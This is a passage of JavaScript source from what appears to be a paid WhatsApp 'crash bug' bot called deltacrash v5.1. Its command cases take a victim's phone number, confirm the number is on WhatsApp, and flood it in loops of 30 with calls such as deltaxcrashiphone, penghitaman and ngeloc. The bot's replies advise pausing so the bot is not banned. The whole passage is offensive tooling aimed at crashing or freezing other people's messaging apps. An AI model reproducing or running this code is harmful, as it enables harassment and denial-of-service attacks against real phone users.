await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await penghitaman(target, deltaxcrashcrash2)
await penghitaman(target, deltaxcrashcrash2)
await penghitaman(target, deltaxcrashcrash2)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await penghitaman(target, deltaxcrashcrash2)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case '🤯': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await penghitaman(target, deltaxcrashcrash2)
await penghitaman(target, deltaxcrashcrash2)
await penghitaman(target, deltaxcrashcrash2)
await penghitaman(target, deltaxcrashcrash2)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await penghitaman(target, deltaxcrashcrash2)
await penghitaman(target, deltaxcrashcrash2)
await penghitaman(target, deltaxcrashcrash2)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await penghitaman(target, deltaxcrashcrash2)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
}
await reply(`彡 Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'hentai-blank': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'japan': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break

case 'yandex': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'hentai': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case 'brazzers': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break;
case 'xnxx': { 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
await ngeloc(target, deltaxcrashcrash)
await deltaxcrashdevil(target, deltaxcrashcrash)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. 彡\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case "hardcore-maker": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "hardcore-lcd": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "hardcore-dark": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "hardcore-cover": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "hardcore-lock": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "hardcore-evos": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
   case "xandroid2":
  {
	if (!isOwner) return
	{
      return reply("*This feature is for the bot only!*");
    }
    if (!text){
      return reply(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return reply("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    reply("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendVariousMessages(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('彡');
  }
  break;
case "hardcore-geek": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "crashxv-strong": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "crashxv-wirles": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
